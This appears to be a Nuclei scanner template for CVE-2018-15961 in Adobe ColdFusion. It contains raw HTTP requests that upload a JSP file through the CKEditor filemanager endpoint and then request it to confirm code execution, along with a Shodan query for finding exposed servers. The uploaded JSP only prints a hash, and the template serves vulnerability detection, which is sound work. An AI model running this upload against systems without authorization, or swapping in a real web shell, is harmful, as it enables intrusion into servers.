id: CVE-2018-15961
info:
  name: Adobe ColdFusion - Unrestricted File Upload Remote Code Execution
  author: SkyLark-Lab,ImNightmaree
  severity: critical
  description: Adobe ColdFusion software versions prior to July 12, 2018 are vulnerable
    to unrestricted file upload leading to arbitrary code execution.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2018-15961
  - https://github.com/xbufu/CVE-2018-15961
  - https://helpx.adobe.com/security/products/coldfusion/apsb18-33.html
  - http://web.archive.org/web/20220309060906/http://www.securitytracker.com/id/1041621
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-15961
    cwe-id: CWE-434
  metadata:
    shodan-query: http.component:"Adobe ColdFusion"
    impact: The unrestricted file upload vulnerability in Adobe ColdFusion can lead
      to arbitrary code execution, which can have a significant impact on the security
      and functionality of affected systems.
    recommendation: It is recommended that Adobe ColdFusion users immediately update
      to the latest version released after July 12, 2018, to mitigate the unrestricted
      file upload vulnerability and prevent potential arbitrary code execution.
  tags: cve,cve2018,adobe,rce,coldfusion,fileupload,kev,intrusive
requests:
- raw:
  - "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1\n\
    Host: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------24464570528145\n\
    \n-----------------------------24464570528145\nContent-Disposition: form-data;\
    \ name=\"file\"; filename=\"{{randstr}}.jsp\"\nContent-Type: image/jpeg\n\n<%@\
    \ page import=\"java.util.*,java.io.*\"%>\n<%@ page import=\"java.security.MessageDigest\"\
    %>\n<%\nString cve = \"CVE-2018-15961\";\nMessageDigest alg = MessageDigest.getInstance(\"\
    MD5\");\nalg.reset();\nalg.update(cve.getBytes());\nbyte[] digest = alg.digest();\n\
    StringBuffer hashedpasswd = new StringBuffer();\nString hx;\nfor (int i=0;i<digest.length;i++){\n\
    \  hx =  Integer.toHexString(0xFF & digest[i]);\n  if(hx.length() == 1){hx = \"\
    0\" + hx;}\n  hashedpasswd.append(hx);\n}\nout.println(hashedpasswd.toString());\n\
    %>\n-----------------------------24464570528145\nContent-Disposition: form-data;\
    \ name=\"path\"\n\n{{randstr}}.jsp\n-----------------------------24464570528145--\n"
  - 'GET /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - ddbb3e76f92e78c445c8ecb392beb225
  - type: status
    status:
    - 200
